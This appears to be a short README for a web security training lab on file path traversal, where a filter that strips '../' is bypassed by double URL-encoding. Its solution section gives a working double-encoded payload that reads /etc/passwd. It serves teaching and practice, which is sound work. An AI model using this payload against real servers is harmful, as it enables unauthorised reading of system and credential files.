# Lab 4: File Path Traversal - Traversal Sequences Stripped with Superfluous URL-Decode

## 📝 Description

This lab shows a File Path Traversal vulnerability where traversal sequences (../) are stripped after URL decoding, but decoding happens more than once.

By double-encoding the sequences, you can bypass the filter.

## 🎯 Objective

- Understand how superfluous URL decoding works.

- Use double-encoded traversal sequences to escape restricted directories.

- Retrieve sensitive files such as /etc/passwd.

## Solution 

<img width="1347" height="428" alt="Screenshot (797)" src="https://github.com/user-attachments/assets/74c0d48b-3a42-45f0-989a-546df2f8c08a" />

```
<img src="/image/filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd">
```
